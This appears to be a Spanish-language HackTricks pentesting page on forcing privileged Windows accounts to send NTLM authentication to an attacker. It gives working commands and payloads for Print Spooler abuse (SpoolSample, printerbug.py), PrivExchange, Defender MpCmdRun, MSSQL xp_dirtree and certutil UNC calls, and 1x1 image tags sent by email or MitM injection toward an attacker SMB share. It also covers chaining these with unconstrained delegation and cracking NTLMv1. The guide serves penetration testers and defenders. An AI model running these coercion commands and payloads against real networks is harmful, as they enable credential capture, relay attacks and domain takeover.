# Forzar la Autenticación con Privilegios NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) es una **colección** de **disparadores de autenticación remota** codificados en C# utilizando el compilador MIDL para evitar dependencias de terceros.

## Abuso del Servicio Spooler

Si el servicio _**Print Spooler**_ está **habilitado**, puedes utilizar algunas credenciales de AD ya conocidas para **solicitar** al servidor de impresión del Controlador de Dominio una **actualización** sobre nuevos trabajos de impresión y simplemente decirle que **envíe la notificación a algún sistema**.\
Ten en cuenta que cuando la impresora envía la notificación a sistemas arbitrarios, necesita **autenticarse contra** ese **sistema**. Por lo tanto, un atacante puede hacer que el servicio _**Print Spooler**_ se autentique contra un sistema arbitrario, y el servicio **utilizará la cuenta del equipo** en esta autenticación.

### Encontrar Servidores Windows en el dominio

Usando PowerShell, obtén una lista de equipos Windows. Por lo general, los servidores tienen prioridad, así que centrémonos en ellos:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Encontrar servicios de Spooler escuchando

Utilizando una versión ligeramente modificada de [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), verifique si el Servicio de Spooler está escuchando:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
También puedes usar rpcdump.py en Linux y buscar el Protocolo MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Solicitar al servicio que se autentique contra un host arbitrario

Puedes compilar [**SpoolSample desde aquí**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
O utiliza [**dementor.py** de 3xocyte](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si estás en Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinando con Delegación sin Restricciones

Si un atacante ya ha comprometido una computadora con [Delegación sin Restricciones](unconstrained-delegation.md), el atacante podría **hacer que la impresora se autentique contra esta computadora**. Debido a la delegación sin restricciones, el **TGT** de la **cuenta de computadora de la impresora** se guardará en la **memoria** de la computadora con delegación sin restricciones. Como el atacante ya ha comprometido este host, podrá **recuperar este ticket** y abusar de él ([Pass the Ticket](pass-the-ticket.md)).

## Autenticación Forzada de RCP

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

El ataque `PrivExchange` es el resultado de una falla encontrada en la característica **PushSubscription del servidor Exchange**. Esta característica permite que el servidor Exchange sea forzado por cualquier usuario de dominio con un buzón para autenticarse en cualquier host proporcionado por el cliente a través de HTTP.

Por defecto, el **servicio Exchange se ejecuta como SYSTEM** y se le otorgan privilegios excesivos (específicamente, tiene **privilegios WriteDacl en la actualización acumulativa pre-2019 del dominio**). Esta falla puede ser explotada para habilitar el **reenvío de información a LDAP y posteriormente extraer la base de datos NTDS del dominio**. En casos donde el reenvío a LDAP no es posible, esta falla aún puede ser utilizada para reenviar y autenticar en otros hosts dentro del dominio. La explotación exitosa de este ataque otorga acceso inmediato al Administrador de Dominio con cualquier cuenta de usuario de dominio autenticada.

## Dentro de Windows

Si ya estás dentro de la máquina Windows, puedes forzar a Windows a conectarse a un servidor utilizando cuentas privilegiadas con:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
O utiliza esta otra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es posible utilizar el lolbin certutil.exe (binario firmado por Microsoft) para forzar la autenticación NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Inyección de HTML

### A través de correo electrónico

Si conoces la **dirección de correo electrónico** del usuario que inicia sesión en una máquina que deseas comprometer, simplemente puedes enviarle un **correo electrónico con una imagen de 1x1 píxeles** como la siguiente:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
### MitM

Si puedes realizar un ataque de MitM a una computadora e inyectar HTML en una página que visualizará, podrías intentar inyectar una imagen como la siguiente en la página:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Descifrado de NTLMv1

Si puedes capturar [desafíos NTLMv1 lee aquí cómo descifrarlos](../ntlm/#ntlmv1-attack).\
_Recuerda que para descifrar NTLMv1 necesitas establecer el desafío de Responder en "1122334455667788"_
